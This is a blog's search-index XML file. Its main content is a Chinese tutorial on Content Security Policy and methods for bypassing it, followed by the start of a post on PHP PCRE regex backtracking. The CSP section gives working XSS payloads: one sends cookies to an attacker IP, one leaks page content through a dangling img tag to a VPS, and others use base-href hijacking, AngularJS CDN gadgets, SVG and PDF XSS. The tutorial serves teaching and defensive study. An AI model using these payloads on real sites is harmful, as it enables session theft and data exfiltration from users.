<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSP策略及绕过方法</title>
    <url>/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>XSS是最常见、危害最大的网页安全漏洞，想要抵御它们，要采取非常多编程措施，非常麻烦。那么，有没有可以从根本上解决问题，浏览器自动禁止外部注入恶意脚本的方法呢？CSP应运而生。</p>
<h2 id="什么是CSP"><a href="#什么是CSP" class="headerlink" title="什么是CSP"></a>什么是CSP</h2><p>CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，它实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，哪些不可以。</p>
<h2 id="CSP策略组成"><a href="#CSP策略组成" class="headerlink" title="CSP策略组成"></a>CSP策略组成</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;指令范围&gt; &lt;内容源&gt; </span><br></pre></td></tr></table></figure>

<h3 id="指令范围"><a href="#指令范围" class="headerlink" title="指令范围"></a>指令范围</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script-src：外部脚本</span><br><span class="line">style-src：样式表</span><br><span class="line">img-src：图像</span><br><span class="line">media-src：媒体文件（音频和视频）</span><br><span class="line">font-src：字体文件</span><br><span class="line">object-src：插件（比如 Flash）</span><br><span class="line">child-src：框架</span><br><span class="line">frame-ancestors：嵌入的外部资源（比如&lt;frame&gt;、&lt;iframe&gt;、&lt;embed&gt;和&lt;applet&gt;）</span><br><span class="line">connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）</span><br><span class="line">worker-src：worker脚本</span><br><span class="line">manifest-src：manifest 文件</span><br><span class="line">dedault-src：默认配置</span><br><span class="line">frame-ancestors：限制嵌入框架的网页</span><br><span class="line">base-uri：限制&lt;base#href&gt;</span><br><span class="line">form-action：限制&lt;form#action&gt;</span><br><span class="line">block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</span><br><span class="line">upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</span><br><span class="line">plugin-types：限制可以使用的插件格式</span><br><span class="line">sandbox：浏览器行为的限制，比如不能有弹出窗口等。</span><br></pre></td></tr></table></figure>

<h3 id="内容源"><a href="#内容源" class="headerlink" title="内容源"></a>内容源</h3><p>内容源主要由[源列表] [关键字] [数据]组成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">关键字(需要用单引号包裹)</span><br><span class="line">	&#39;none&#39;</span><br><span class="line">		代表空集；即不匹配任何 URL</span><br><span class="line">	&#39;self&#39;</span><br><span class="line">		代表和文档同源，包括相同的 URL 协议和端口号</span><br><span class="line">	&#39;unsafe-inline&#39;</span><br><span class="line">		允许使用内联资源，如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素</span><br><span class="line">	&#39;unsafe-eval&#39;</span><br><span class="line">		允许使用 eval() 等通过字符串创建代码的方法</span><br><span class="line">	*</span><br><span class="line">		星号表示允许任何URL资源，没有限制</span><br><span class="line">源列表</span><br><span class="line">	http:&#x2F;&#x2F;*.foo.com （匹配所有使用 http协议加载 foo.com 任何子域名的尝试。）</span><br><span class="line">	mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）</span><br><span class="line">	https:&#x2F;&#x2F;store.foo.com （匹配所有使用 https协议访问 store.foo.com 的尝试。）</span><br><span class="line">	......    </span><br><span class="line">数据</span><br><span class="line">	data:</span><br><span class="line">		仅允许数据模式（如Base64编码的图片）方式加载资源</span><br><span class="line">	mediastream:</span><br><span class="line">		允许mediastream: URI作为内容来源</span><br></pre></td></tr></table></figure>

<h3 id="实现demo"><a href="#实现demo" class="headerlink" title="实现demo"></a>实现demo</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">通过响应头实现：</span><br><span class="line">Content-Security-policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;;<span class="comment">&lt;!--关键字作为内容源--&gt;</span></span><br><span class="line">Content-Security-policy: default-src &#x27;self&#x27;; script-src allowed.com;<span class="comment">&lt;!--源列表作为内容源--&gt;</span></span><br><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; img-src &#x27;self&#x27; data:; media-src mediastream: <span class="comment">&lt;!--数据作为内容源--&gt;</span></span><br><span class="line">通过html元标签实现：</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; img-src https://*; child-src &#x27;none&#x27;;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>本文未说明代码的例子由下面demo代码改造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;session&#x27;</span>])) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;session&#x27;</span>,md5(rand(<span class="number">0</span>,<span class="number">1000</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">        header(<span class="string">&quot;Content-Security-Policy: script-src &#x27;unsafe-inline&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP-safe&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your POST content&quot;</span>.@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x01-重定向绕过"><a href="#0x01-重定向绕过" class="headerlink" title="0x01 重定向绕过"></a>0x01 重定向绕过</h3><p><strong>条件</strong></p>
<p>1.可以执行任意js脚本，但由于CSP无法数据外带</p>
<p>2.CSP为<code>script-src &#39;unsafe-inline&#39;</code></p>
<p><strong>绕过方法</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">a=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://10.146.110.37:7777?&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--也可用window.location/window.open()跳转方法外带数据--&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614160730764.png" class="" title="image-20210614160730764">

<h3 id="0x02-meta网页跳转绕过"><a href="#0x02-meta网页跳转绕过" class="headerlink" title="0x02 meta网页跳转绕过"></a>0x02 meta网页跳转绕过</h3><p><strong>绕过条件</strong></p>
<p>无</p>
<p><strong>绕过方法（只能跳转，无法携带数据）</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">a=<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1;url=http://10.146.110.37:7777&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>效果图</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614160921062.png" class="" title="image-20210614160921062">

<h3 id="0x03-iframe标签绕过"><a href="#0x03-iframe标签绕过" class="headerlink" title="0x03 iframe标签绕过"></a>0x03 iframe标签绕过</h3><p><strong>条件</strong></p>
<p>1.一个同源站点存在两个页面，其中一个有CSP保护，一个没有且存在xss漏洞</p>
<p>2.我们要的数据在存在CSP保护的页面中</p>
<p><strong>绕过方法</strong></p>
<p>B页面利用iframe加载A页面，绕过A页面CSP策略。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--A.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--B.html--&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">&#x27;iframe&#x27;</span>);iframe.src=<span class="string">&quot;http://localhost/CSP/demo3/A.html&quot;</span>;<span class="built_in">document</span>.body.appendChild(iframe);<span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">&#x27;flag&#x27;</span>).innerHTML),<span class="number">1000</span>);<span class="comment">//setTimeout是为了等待iframe加载完成</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614161923694.png" class="" title="image-20210614161923694">

<p><strong>其他利用方法</strong></p>
<p>在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http://xxx”页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库：<code>&lt; iframe csp=&quot;script-src &#39;unsafe-inline&#39;&quot; src=&quot;http://xxx&quot;&gt;&lt;/iframe&gt;</code></p>
<h3 id="0x04-CDN绕过"><a href="#0x04-CDN绕过" class="headerlink" title="0x04 CDN绕过"></a>0x04 CDN绕过</h3><p>一般来说，前端要用到许多的前端框架和库，而部分企业为了效率或者其他原因，会选择使用其他CDN上的js框架，当这些CDN上存在一些低版本的框架时，就可能存在绕过CSP的风险</p>
<p><strong>利用条件</strong></p>
<p>1.该CDN服务商在CSP白名单中</p>
<p>2.CDN服务商存在低版本的js库</p>
<p><strong>demo</strong></p>
<p>csp设置</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">content-security-policy: script-src &#x27;self&#x27; vimeo.com &#x27;unsafe-eval&#x27; https://cdnjs.cloudflare.com </span><br></pre></td></tr></table></figure>

<p>绕过方法</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span> </span><br><span class="line">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162055744.png" class="" title="image-20210614162055744">

<p>这里的绕过方法详细说明可以参考链接</p>
<p><a class="link"   href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" >https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/google/security-research-pocs/tree/master/script-gadgets" >https://github.com/google/security-research-pocs/tree/master/script-gadgets<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="0x05-不完整script标签绕过"><a href="#0x05-不完整script标签绕过" class="headerlink" title="0x05 不完整script标签绕过"></a>0x05 不完整script标签绕过</h3><p><strong>条件</strong></p>
<p>1.可控点在合法script标签上方,且其中没有其他标签</p>
<p>2.XSS页面的CSP <code>script-src</code>只采用了<code>nonce</code>方式</p>
<p><strong>demo</strong></p>
<p>csp设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;default-src &#39;self&#39;; script-src &#39;nonce-xxxxx&#39;&quot;&gt;&lt;?php echo $_GET[&#39;a&#39;]?&gt;</span><br><span class="line">&lt;script nonce&#x3D;&#39;xxxxx&#39;&gt;  &#x2F;&#x2F;do some thing&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>利用方法</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?a=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/plain,alert(1)</span></span></span><br></pre></td></tr></table></figure>

<p>我们可以发现&lt;script就会被变成一个属性，值为空，之后的<code>nonce=&#39;xxxxx&#39;</code>会被当成我们输入的script标签中的一个属性，成功绕过<code>script-src</code>，<code>&lt;/script</code>就会被变成一个属性，值为空</p>
<p>火狐浏览器</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162119762.png" class="" title="image-20210614162119762">

<p>上述绕过方法在chrome浏览器不生效，因为在chrome中，虽然第二个&lt;script 被当成了属性名，但依旧会干扰chrome对标签的解析，造成错误，使我们的exp无法成功执行。这里可以用到标签的一个技巧，当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略。</p>
<p>例如<code>&lt;h1 a=&quot;123&quot; b=&quot;456&quot; a=&quot;789&quot; a=&quot;abc&quot;&gt;123&lt;/h1&gt;</code>，这里a属性的值为123，所以就可以通过如下pyaload绕过</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?a=123<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:text/plain,alert(1)&quot;</span> <span class="attr">a</span>=<span class="string">123</span> <span class="attr">a</span>= </span></span><br></pre></td></tr></table></figure>


<p>先新建一个a属性，然后再新建第二个a属性，这样我们就将第二个&lt;script赋给了第二个a属性</p>
<p>chrome浏览器</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162131003.png" class="" title="image-20210614162131003">

<p>这里查看页面标签已经嵌入成功，但src却执行不了就很奇怪</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162138551.png" class="" title="image-20210614162138551">

<h3 id="0x06-不完整的资源标签获取资源"><a href="#0x06-不完整的资源标签获取资源" class="headerlink" title="0x06 不完整的资源标签获取资源"></a>0x06 不完整的资源标签获取资源</h3><p><strong>条件</strong></p>
<p>1.可以加载外域资源 (<code>img-src: *</code>)</p>
<p>2.需要获取页面某处的信息</p>
<p><strong>demo</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;default-src &#39;self&#39;;script-src &#39;self&#39;; img-src *;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&#39;xss&#39;]?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;0xffff&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;h2 id&#x3D;&quot;id&quot;&gt;3&lt;&#x2F;h2&gt;</span><br></pre></td></tr></table></figure>

<p>利用方法</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/csp.php?xss=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;//vps_ip?a=</span></span></span><br></pre></td></tr></table></figure>

<p>注意这里src只有左边的引号</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162156829.png" class="" title="image-20210614162156829">

<p>chorme下该payload并不会成功，因为chrome不允许发出的url中含有回车或&lt;</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162208999.png" class="" title="image-20210614162208999">

<h3 id="0x07-站点可控静态资源绕过"><a href="#0x07-站点可控静态资源绕过" class="headerlink" title="0x07 站点可控静态资源绕过"></a>0x07 站点可控静态资源绕过</h3><p><strong>条件</strong></p>
<p>1.可控的静态资源站点在白名单内</p>
<p><strong>demo</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用方法</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>案例中CSP设置了<code>unsafe-eval</code>白名单为<code>www.google-analytics.com</code> ，而<code>www.google.analytics.com</code>中提供了自定义javascript的功能（google会封装自定义的js，所以还需要<code>unsafe-eval</code>），于是可以绕过CSP</p>
<h3 id="0x08-302跳转绕过"><a href="#0x08-302跳转绕过" class="headerlink" title="0x08 302跳转绕过"></a>0x08 302跳转绕过</h3><p><strong>条件</strong></p>
<p>1.在script-src允许的域下有需要获取的信息</p>
<p>2.在script-src允许的域下存在任意重定向</p>
<p><strong>demo</strong></p>
<p>a目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- csp.php --&gt;</span><br><span class="line">&lt;?php header(&quot;Content-Security-Policy: default-src &#39;self&#39;;script-src http:&#x2F;&#x2F;127.0.0.1&#x2F;a&#x2F;&quot;);?&gt; </span><br><span class="line">&lt;html&gt; &lt;head&gt; &lt;&#x2F;head&gt; &lt;body&gt;     csp header test  &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- redirect.php --&gt;</span><br><span class="line">&lt;?php header(&quot;Location: &quot; . $_GET[url]);?&gt;</span><br></pre></td></tr></table></figure>

<p>b目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- test.php --&gt;</span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;script&gt;alert(123)&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;	</span><br></pre></td></tr></table></figure>

<p><strong>利用方法</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;a&#x2F;redirect.php?url&#x3D;&#x2F;b&#x2F;test.php</span><br></pre></td></tr></table></figure>

<p>csp限制了<code>/a/</code>目录，而我们的目标脚本在<code>/b/</code>目录下则如果这时候请求redirect页面去访问<code>/b/</code>下的脚本是可以通过csp的检查的</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162229814.png" class="" title="image-20210614162229814">

<h3 id="0x09-Base-uri绕过"><a href="#0x09-Base-uri绕过" class="headerlink" title="0x09 Base-uri绕过"></a>0x09 Base-uri绕过</h3><p><strong>条件</strong></p>
<ol>
<li><code>script-src</code>只使用<code>nonce</code></li>
<li>没有额外设置base-uri</li>
<li>页面引用存在相对路径的<code>&lt;script&gt;</code>标签</li>
</ol>
<p><strong>demo</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;//10.146.110.37/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&#x27;test&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162248786.png" class="" title="image-20210614162248786">

<p>如果未设置nonce将无法绕过</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162255139.png" class="" title="image-20210614162255139">

<h3 id="0x10-SVG绕过"><a href="#0x10-SVG绕过" class="headerlink" title="0x10 SVG绕过"></a>0x10 SVG绕过</h3><p><strong>条件</strong></p>
<p>1.可以上传svg图片</p>
<p><strong>利用方法</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;&lt;svg version&#x3D;&quot;1.1&quot; id&#x3D;&quot;Layer_1&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; x&#x3D;&quot;0px&quot; y&#x3D;&quot;0px&quot; width&#x3D;&quot;100px&quot; height&#x3D;&quot;100px&quot; viewBox&#x3D;&quot;0 0 751 751&quot; enable-background&#x3D;&quot;new 0 0 751 751&quot; xml:space&#x3D;&quot;preserve&quot;&gt;  &lt;image id&#x3D;&quot;image0&quot; width&#x3D;&quot;751&quot; height&#x3D;&quot;751&quot; x&#x3D;&quot;0&quot; y&#x3D;&quot;0&quot;    href&#x3D;&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; &#x2F;&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x11-CRLF绕过"><a href="#0x11-CRLF绕过" class="headerlink" title="0x11 CRLF绕过"></a>0x11 CRLF绕过</h3><p>当页面存在CRLF漏洞时，且返回的CSP头在我们可控点的下方，则可通过回车换行注入CSP返回头绕过。该绕过方法较简单，这里就举例了</p>
<h3 id="0x12-object-src绕过（PDFXSS）"><a href="#0x12-object-src绕过（PDFXSS）" class="headerlink" title="0x12 object-src绕过（PDFXSS）"></a>0x12 object-src绕过（PDFXSS）</h3><p>在CSP标准里面，有一个属性是<code>object-src</code>，它限制的是<code>&lt;embed&gt;</code> <code>&lt;object&gt;</code> <code>&lt;applet&gt;</code>标签的src，也就是插件的src<br>于是我们可以通过插件来执行Javascript代码，插件的js代码并不受<code>script-src</code>的约束</p>
<p><strong>利用条件</strong></p>
<ol>
<li>没有设置<code>object-src</code>，或者<code>object-src</code>没有设置为<code>&#39;none&#39;</code></li>
<li>pdf用的是chrome的默认解析器</li>
</ol>
<p><strong>demo</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;&quot;&gt;&lt;?php echo $_GET[&#39;xss&#39;]?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>构造pdf的XSS放在vps上</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162329478.png" class="" title="image-20210614162329478">

<p>然后在XSS处写入embed标签且src为pdf连接</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//vps_ip/123.pdf&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162334912.png" class="" title="image-20210614162334912">

<p>但是PDF的XSS并不是为所欲为，比如pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等</p>
<p>具体能执行哪些恶意js可以参考这篇<a class="link"   href="https://blog.csdn.net/microzone/article/details/52850623" >文章<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://mp.weixin.qq.com/s/RgIQi5rQA7EO3iDFEQbVCA" >CSP浅析与绕过<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/5084" >我的CSP绕过思路及总结<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.jianshu.com/p/f1de775bc43e" >CSP策略及绕过方法<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://cloud.tencent.com/developer/chapter/13541" >CSP开发者手册–腾讯云<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://paper.seebug.org/423" >前端防御从入门到弃坑–CSP变迁<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>PHP的PCRE库回溯问题</title>
    <url>/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>最近发现对PCRE的回溯机制理解还是很模糊，决定再仔细复习记录下</p>
<h2 id="DFA与NFA"><a href="#DFA与NFA" class="headerlink" title="DFA与NFA"></a>DFA与NFA</h2><p>先简单了解下DFA与NFA这两种正则引擎：DFA为确定性有穷自动机，是文本主导，NFA为非确定性有穷自动机，是表达式主导。</p>
<p>DFA与NFA机制上的不同带来3种主要影响：</p>
<ol>
<li>DFA对于文本串里的每一个字符只需扫描一次，比较快，但特性较少；NFA要翻来覆去吃字符、吐字符，速度慢，但是特性丰富，所以反而应用广泛，当今主要的正则表达式引擎，如Perl、Ruby、Python的re模块、Java和.NET的regex库，都是NFA的。</li>
<li>NFA急于邀功请赏，所以最左子正则式优先匹配成功，因此偶尔会错过最佳匹配结果；DFA则是“最长的左子正则式优先匹配成功”。</li>
<li>NFA可能会陷入递归调用的陷阱而表现得性能极差。</li>
</ol>
<p><strong>针对第2点，这里举个例子来说明：</strong></p>
<p>比如正则表达式<code>/aaa|aaabbb/</code>与字符串<code>aaabbbccc</code>匹配，在php和awk的匹配结果就不一样。</p>
<p>php的pcre库是NFA引擎，<strong>匹配结果是aaa</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; preg_match(<span class="string">&#x27;/aaa|aaabbb/&#x27;</span>,<span class="string">&#x27;aaabbbccc&#x27;</span>,<span class="variable">$matches</span>);</span><br><span class="line">php &gt; print_r(<span class="variable">$matches</span>);</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; aaa</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>awk使用的是DFA引擎，这里通过awk的sub函数将正则匹配中的内容替换为<code>(replace)</code>，可以看到<strong>匹配中的是aaabbb</strong>。</p>
